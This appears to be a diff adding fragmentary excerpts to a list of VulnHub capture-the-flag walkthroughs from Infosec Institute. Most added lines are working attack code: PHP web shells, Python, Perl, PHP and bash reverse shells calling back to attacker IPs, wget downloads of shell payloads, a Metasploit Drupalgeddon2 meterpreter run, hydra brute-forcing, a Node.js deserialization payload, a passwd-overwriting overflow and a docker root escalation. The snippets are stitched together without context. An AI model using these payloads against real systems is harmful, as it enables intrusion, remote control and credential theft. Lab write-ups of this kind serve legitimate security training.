@@ -1318,6 +1318,11 @@ Challenge URL: https://resources.infosecinstitute.com/topic/lazyadmin-ctf-walkth
 Challenge Name: photographer-1-vulnhub-ctf-walkthrough-part-2
 Challenge URL: https://resources.infosecinstitute.com/topic/photographer-1-vulnhub-ctf-walkthrough-part-2/
 
+Create a malicious PHP file with this content: <?php system($_GET[‘cmd’]);?>
+Save as “image.php.jpg”
+Authenticated, go to Koken CMS Dashboard, upload your file on “Import Content” button (Library panel) and send the HTTP request to Burp
+On Burp, rename your file to “image.php”
+On Koken CMS Library, select your file and put the mouse on “Download File” to see where your file is hosted on server
 
 
 
@@ -1372,6 +1377,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/source-1-vulnhub-ctf
 Challenge Name: pwned-1-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/pwned-1-vulnhub-ctf-walkthrough/
 
+“I am Annlynn. I am the hacker hacked your server with your employees but they don’t know how I used them”
 
 
 
@@ -1426,6 +1432,8 @@ Challenge URL: https://resources.infosecinstitute.com/topic/hacknos-player-1-ctf
 Challenge Name: me-and-my-girlfriend-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/me-and-my-girlfriend-1-ctf-walkthrough/
 
+Please note:
+For all these machines, I have used Oracle VirtualBox to run the downloaded machine. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes, and I am not responsible if the listed techniques are used against any other targets.
 
 
 
@@ -1438,24 +1446,35 @@ Challenge URL: https://resources.infosecinstitute.com/topic/dmv-1-vulnhub-captur
 Challenge Name: djinn-1-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/djinn-1-ctf-walkthrough-part-1/
 
+Please note:
+For all these machines, I have used Oracle VirtualBox to run the downloaded machine. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes and I am not responsible if the listed techniques are used against any other targets.
+Note: The target machine IP address may be different in your case, as it is assigned by the network DHCP.
 
 
 
 Challenge Name: aqua-1-vulnhub-capture-the-flag-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/aqua-1-vulnhub-capture-the-flag-ctf-walkthrough/
 
+Please note:
+For all of these machines, I have used Oracle Virtual Box to run the downloaded machine. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes, and I am not responsible if the listed techniques are used against any other targets.
 
 
 
 Challenge Name: its-october-1-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/its-october-1-vulnhub-ctf-walkthrough/
 
+Please note:
+For all of these machines, I have used Oracle VirtualBox to run the downloaded machine. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes, and I am not responsible if the listed techniques are used against any other targets.
+Note:
+The victim machine IP address may be different in your case, as it is assigned by the network DHCP.
 
 
 
 Challenge Name: dc-8-capture-the-flag-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/dc-8-capture-the-flag-ctf-walkthrough/
 
+Please note:
+For all these machines, I have used Oracle VirtualBox to run the downloaded machine. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes, and I am not responsible if the listed techniques are used against any other targets.
 
 
 
@@ -1468,6 +1487,10 @@ Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-w
 Challenge Name: capture-the-flag-ctf-walkthrough-my-file-server-1
 Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-ctf-walkthrough-my-file-server-1/
 
+Please note:
+For all of these machines, I have used Oracle VirtualBox to run the downloaded VMs. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes, and I am not responsible if the listed techniques are used against any other targets.
+Please note: The victim and attacker machine IP addresses may be different, as per your network configuration.
+none)
 
 
 
@@ -1480,6 +1503,8 @@ Challenge URL: https://resources.infosecinstitute.com/topic/ck-00-ctf-walkthroug
 Challenge Name: matrix-3-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/matrix-3-ctf-walkthrough/
 
+Please note:
+For all these machines, I have used Oracle VirtualBox to run the downloaded machine. I am using Kali Linux as an attacker machine for solving this CTF. The techniques used are solely for educational purposes, and I am not responsible if the listed techniques are used against any other targets.
 
 
 
@@ -1651,12 +1676,39 @@ sudo –i
 Challenge Name: lampiao-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/lampiao-1-ctf-walkthrough/
 
+Command Used:
+netdiscover
+Command Used:
+nmap 192.168.1.24 -p- -sV
+Command Used:
+dirb http://192.168.1.24:1898/
+Commands:
+use exploit/unix/webapp/drupal_drupalgeddon2
+show options
+Command Used:
+set rhost 192.168.1.24
+set rport 1898
+show options
+Command Used:
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.23
+set lport 443
+Command Used:
+show options
+Command Used:
+shell
+id
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+uname -a
+cat /etc/issue
 
 
 
 Challenge Name: node-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/node-1-ctf-walkthrough/
 
+cat myplace.backup | base64 -d > myplace
+file myplace
 
 
 
@@ -1669,12 +1721,44 @@ Challenge URL: https://resources.infosecinstitute.com/topic/golden-eye-1-ctf-wal
 Challenge Name: goldeneye-1-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/goldeneye-1-ctf-walkthrough-part-1/
 
+Command Used: netdiscover
+Command Used: nmap 192.168.1.10 -Pn -p- -sV
+Command Used: hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 5007 pop3
+Command Used: hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.10 -s 55007 pop3
 
 
 
 Challenge Name: wakanda1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/wakanda1-ctf-walkthrough/
 
+Command Used: nmap -p- 192.168.1.11 -sV
+Command Used: dirb http://192.168.1.11/
+Command Used:  ssh mamadou@192.168.1.11 -p 3333
+Command Used: import pty; pty.spawn(“/bin/bash”)
+Command Used:
+uname -a
+cat /etc/issue
+#! /usr/bin/python
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((“192.168.1.45”,4545));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call([“/bin/sh”,”-i”]);
+Command Used:
+wget 192.168.1.45/pythonshell.py
+cp pythonshell.py /srv/.antivirus.py
+Command Used:
+nc –lvp 4545
+Command Used:
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+cd /home/devops
+ls
+cat flag2.txt
+Command Used: sudo -l
+wget 192.168.1.45/bbbb/setup.py
+sudo /usr/bin/pip install . –upgrade –force-reinstall
 
 
 
@@ -1693,24 +1777,43 @@ Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-2-ctf-walkth
 Challenge Name: temple-of-doom-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/temple-of-doom-ctf-walkthrough-part-1/
 
+eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2xzIC1sIC8nLChlLG91dCxlcnIpPT57Y29uc29sZS5sb2cob3V0KTt9KTsgfSgpIn0=
 
 
 
 Challenge Name: basic-pentesting-2-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/basic-pentesting-2-ctf-walkthrough/
 
+"2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
+using version 2.5.12, because other versions were giving me trouble. -K
+2018-04-22: SMB has been configured. -K
+2018-04-21: I got Apache set up. Will put in our content later. –J”
+"For J:
+I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP.
+-K"
+Username: jan
+Password: Armando
 
 
 
 Challenge Name: toppo-1-capture-the-flag-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/toppo-1-capture-the-flag-walkthrough/
 
+Command Used: Netdiscover
+Command Used: nmap 192.168.1.7 -v -Pn
+Command Used: dirb http://192.168.1.7/
+Command Used : uname –a, cat /etc/issue
+Command Used : find / -perm -u=s -type f 2>/dev/null
+Command Used : /usr/bin/python2.7 -c ‘import pty;pty.spawn(“/bin/sh”)’
 
 
 
 Challenge Name: jis-ctf-vulnupload-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/jis-ctf-vulnupload-walkthrough/
 
+<?php if(isset($_REQUEST[‘cmd’])){ echo “<pre>”; $cmd = ($_REQUEST[‘cmd’]); system($cmd); echo “</pre>”; die; }?>
+
+perl -e ‘use Socket;$i=”192.168.1.45″;$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
 
 
 
@@ -1723,6 +1826,25 @@ Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-2-ctf-
 Challenge Name: usv-2017-part-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-1-ctf-walkthrough/
 
+function validate() {
+var _0xb252x2 = 123211;
+var _0xb252x3 = 3422543454;
+var _0xb252x4 = document[‘forms’][‘password’][‘passinp’][‘value’];
+var _0xb252x5 = md5(_0xb252x4);
+_0xb252x4 += 4469;
+_0xb252x4 -= 234562221224;
+_0xb252x4 *= 1988;
+_0xb252x2 -= 2404;
+_0xb252x3 += 2980097;
+if (_0xb252x4 == 1079950212331060) {
+document[‘getElementById’](‘valid’)[‘style’][‘color’] = ‘green’;
+document[‘getElementById’](‘valid’)[‘innerHTML’] = ‘Italy:’ + _0xb252x5
+} else {
+document[‘getElementById’](‘valid’)[‘style’][‘color’] = ‘red’;
+document[‘getElementById’](‘valid’)[‘innerHTML’] = ‘Incorrect!’
+};
+return false
+}
 
 
 
@@ -1735,30 +1857,55 @@ Challenge URL: https://resources.infosecinstitute.com/topic/6-days-lab-1-1-ctf-w
 Challenge Name: bulldog-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-1-ctf-walkthrough/
 
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.11”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’&
 
 
 
 Challenge Name: zico-2-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/zico-2-1-ctf-walkthrough/
 
+<?php
+system (” cd /tmp; wget 192.168.100.105/hehe;”);
+?>
+<?php
+system ($_GET[‘cmd’]);
+?>
 
 
 
 Challenge Name: depth-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/depth-1-ctf-walkthrough/
 
+sh -c $@|sh . echo ssh bill@localhost sudo -l
+sh -c $@|sh . echo ssh bill@localhost sudo ufw disable
+sh -c $@|sh . echo ssh bill@localhost sudo wget “http://10.0.2.15:8000/shell.jsp” -O /var/lib/tomcat8/webapps/ROOT/shell.jsp
+ssh bill@localhost sudo bash -i>& /dev/tcp/10.0.2.15/4444 0>&1
 
 
 
 Challenge Name: proteus-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/proteus-1-ctf-walkthrough/
 
+$ nmap 172.16.92.0/24
+strings
+objdump
+.
+/
+Echo HEX_CODE | xxd -r -p
+wget http://172.16.92.141/shell.txt -O /tmp/shell.php
+php /tmp/shell.php;
+pattern.py
+$ ./admin_login_logger ‘pattern.py 1024’
+$ pattern.py
+$ ./admin_login_logger ‘chiragh:$1$.T8Oa/jC$BSMBICcTHivnsn3RAXO6N/…:0:0::/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/etc/passwd’
+$ su chiragh
 
 
 
 Challenge Name: acid-server-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/acid-server-ctf-walkthrough/
 
+127.0.0.1; php -r ‘$sock=fsockopen(“192.168.0.91”,3434);exec(“/bin/bash -i <&3 >&3 2>&3”);’
 
 
 
@@ -1783,6 +1930,15 @@ Challenge URL: https://resources.infosecinstitute.com/topic/ew-skuzzy-ctf-walkth
 Challenge Name: pluck-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/pluck-1-ctf-walkthrough/
 
+backup-user
+$ tftp
+tftp> connect 172.16.92.142
+tftp> get backup.tar
+tftp> quit
+backup.tar
+$ tar -xvf backup.tar
+id_key4
+$ ssh -I id_key4 paul@172.16.92.142
 
 
 
@@ -1795,18 +1951,40 @@ Challenge URL: https://resources.infosecinstitute.com/topic/devrandomsleepy-ctf-
 Challenge Name: super-mario-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/super-mario-ctf-walkthrough/
 
+“It’sa meeeee, Maaaaario! Welcome to Super Mario Host! Me and my tall brother had the idea of making a tribute for this machine, we still trying to figure out what to do to keep you entertained! In the meantime you can play with this nice game I’ve added for you 😀 Credits to Mark Robbins, the source code of the game can be found here.”
 
 
 
 Challenge Name: billubox-ctf-walkthrough-2
 Challenge URL: https://resources.infosecinstitute.com/topic/billubox-ctf-walkthrough-2/
 
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.120”,4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 
 
 
 Challenge Name: donkeydocker1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/donkeydocker1-ctf-walkthrough/
 
+$ pip2 install requests_toolbelt
+$ python 40974.py
+$ python -c ‘import pty; pty.spawn(“/bin/bash”)’
+ls -a
+$ mv flag.txt symlink.txt
+$ ln -s /etc/passwd ./flag.txt
+$ rm flag.txt
+$ ln -s /etc/shadow flag.txt
+hacker
+$ mkdir chiragh
+$ cd chiragh
+$ cat > Dockerfile
+FROM debian:wheezy
+ENV WORKDIR /stuff
+RUN mkdir -p $WORKDIR
+VOLUME [ $WORKDIR ]
+WORKDIR $WORKDIR
+$ docker build -t chiragh-docker-image .
+
+$ docker run -v /root:/stuff -t chiragh-docker-image /bin/sh -c ‘id’
 
 
 
@@ -1819,6 +1997,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/hackerfest-sedna-ctf
 Challenge Name: minotaur-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/minotaur-ctf-walkthrough/
 
+great
 
 
 
